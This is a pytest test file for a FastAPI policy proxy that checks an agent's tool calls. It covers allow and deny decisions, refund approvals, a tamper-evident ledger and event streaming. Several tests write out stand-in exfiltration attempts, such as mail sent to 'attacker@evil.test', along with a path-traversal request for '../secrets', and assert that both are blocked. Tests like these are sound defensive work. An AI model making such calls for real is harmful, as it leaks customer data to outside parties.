"""T13: FastAPI service — artifacts, pipeline run, live sessions through the proxy, ledger, SSE."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from api.main import create_app

ROOT = Path(__file__).resolve().parents[1]


@pytest.fixture()
def client(tmp_path: Path) -> TestClient:
    return TestClient(create_app(artifacts_dir=tmp_path / "artifacts", world_dir=ROOT / "world"))


def test_health_and_artifacts_after_startup_pipeline(client: TestClient) -> None:
    assert client.get("/health").json()["status"] == "ok"
    names = client.get("/artifacts").json()
    assert {"catalog.json", "policy.yaml", "verify.json", "invariants.json"} <= set(names)
    policy = client.get("/artifacts/policy.yaml").json()
    assert policy["solver"]["status"] == "OPTIMAL"
    assert client.get("/artifacts/../secrets").status_code == 404
    assert client.get("/artifacts/nope.json").status_code == 404


def test_pipeline_rerun_returns_the_summary(client: TestClient) -> None:
    summary = client.post("/pipeline/run").json()
    assert summary["verify"]["abuse"]["blocked"] == summary["verify"]["abuse"]["n"]


def test_live_session_allows_legit_and_denies_exfiltration(client: TestClient) -> None:
    session = client.post("/live/sessions", json={"customer_id": "C-010", "body": "Please resend my invoice."}).json()
    sid, ctx = session["session_id"], session["context"]
    ok = client.post(f"/live/sessions/{sid}/calls", json={"tool": "mail.send", "args": {
        "to": ctx["ticket.customer.email"], "subject": "Invoice", "body": "Attached."}}).json()
    assert ok["decision"] == "allow"
    bad = client.post(f"/live/sessions/{sid}/calls", json={"tool": "mail.send", "args": {
        "to": "attacker@evil.test", "subject": "x", "body": "y"}}).json()
    assert bad["decision"] == "deny" and bad["reason"] == "to != ticket.customer.email"
    unknown = client.post("/live/sessions/s-ghost/calls", json={"tool": "tickets.get", "args": {}}).json()
    assert unknown["decision"] == "deny"


def test_approval_flow(client: TestClient) -> None:
    session = client.post("/live/sessions", json={"customer_id": "C-010", "body": "Refund please"}).json()
    sid, ctx = session["session_id"], session["context"]
    out = client.post(f"/live/sessions/{sid}/calls", json={"tool": "billing.refund", "args": {
        "invoice_id": ctx["customer.invoice_ids"][0], "amount": 1.0, "currency": ctx["customer.currency"]}}).json()
    assert out["decision"] == "approval"
    assert client.get("/live/approvals").json()[0]["approval_id"] == out["approval_id"]
    done = client.post(f"/live/approvals/{out['approval_id']}", json={"approver": "ops", "approve": True}).json()
    assert done["decision"] == "allow"
    assert client.post(f"/live/approvals/{out['approval_id']}", json={"approver": "ops", "approve": True}).status_code == 404


def test_attack_demo_compares_unprotected_and_protected(client: TestClient) -> None:
    demo = client.post("/live/attack").json()
    assert demo["unprotected"]["result"]["allowed"] is True
    assert demo["unprotected"]["leaked"] is True
    assert demo["protected"]["result"]["allowed"] is False
    assert demo["protected"]["leaked"] is False


def test_ledger_verify_tamper_and_restore(client: TestClient) -> None:
    session = client.post("/live/sessions", json={"customer_id": "C-010", "body": "hi"}).json()
    client.post(f"/live/sessions/{session['session_id']}/calls",
                json={"tool": "mail.send", "args": {"to": "x@evil.test", "subject": "s", "body": "b"}})
    assert len(client.get("/ledger").json()) >= 1
    assert client.get("/ledger/verify").json() == {"intact": True, "first_bad_index": None, "entries": 1}
    client.post("/ledger/tamper", json={"index": 0})
    assert client.get("/ledger/verify").json()["intact"] is False
    client.post("/ledger/restore")
    assert client.get("/ledger/verify").json()["intact"] is True


def test_sse_streams_backfilled_decisions(client: TestClient) -> None:
    session = client.post("/live/sessions", json={"customer_id": "C-010", "body": "hi"}).json()
    client.post(f"/live/sessions/{session['session_id']}/calls",
                json={"tool": "mail.send", "args": {"to": "x@evil.test", "subject": "s", "body": "b"}})
    with client.stream("GET", "/events?max_events=1") as response:
        assert response.headers["content-type"].startswith("text/event-stream")
        body = "".join(response.iter_text())
    data = [json.loads(line[len("data: "):]) for line in body.splitlines() if line.startswith("data: ")]
    assert data[0]["type"] == "decision" and data[0]["entry"]["decision"] == "deny"
